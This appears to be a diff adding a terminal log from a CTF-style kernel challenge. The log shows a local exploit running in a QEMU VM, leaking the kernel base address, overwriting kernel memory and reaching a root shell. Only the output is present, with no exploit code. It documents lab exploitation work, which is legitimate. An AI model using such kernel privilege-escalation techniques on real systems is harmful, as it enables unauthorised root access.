@@ -1,0 +1,35 @@
+[+] starting exploit localy...
+c[?7l[2J[0mSeaBIOS (version 1.15.0-1)
+
+
+iPXE (https://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+0FF8B340+0FECB340 CA00
+Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               
+
+
+Booting from ROM...
+c[?7l[2Jfail to initialize ptp_kvm
+
+Boot took 2.51 seconds
+
+__________________ .____       _____    _______  ________   
+\______   \_____  \|    |     /  _  \   \      \ \______ \  
+ |     ___/ _(__  <|    |    /  /_\  \  /   |   \ |    |  \ 
+ |    |    /       \    |___/    |    \/    |    \|    `   \
+ |____|   /______  /_______ \____|__  /\____|__  /_______  /
+                 \/        \/       \/         \/        \/ 
+/ $ ./ex/ $ ./exploit [J
+[*] single_start = ffffffff811742b0
+[*] kbase = ffffffff81000000
+[*] deleting...
+[*] overwriting...
+[*] exploit!!!
+/ # ls
+[1;34mbin[m      [1;34metc[m      [1;32minit[m     [1;36mlinuxrc[m  [1;34mopt[m      [1;34mrun[m      [1;34mtmp[m
+[1;34mdev[m      [1;32mexploit[m  [1;34mlib[m      [1;34mmedia[m    [1;34mproc[m     [1;34msbin[m     [1;34musr[m
+[1;32mdrothea[m  [1;32mingrid[m   [1;36mlib64[m    [1;34mmnt[m      [1;34mroot[m     [1;34msys[m      [1;34mvar[m
+/ # whoami
+root
+/ # 
+Segmentation fault
+/ $ 
+reboot: Power down
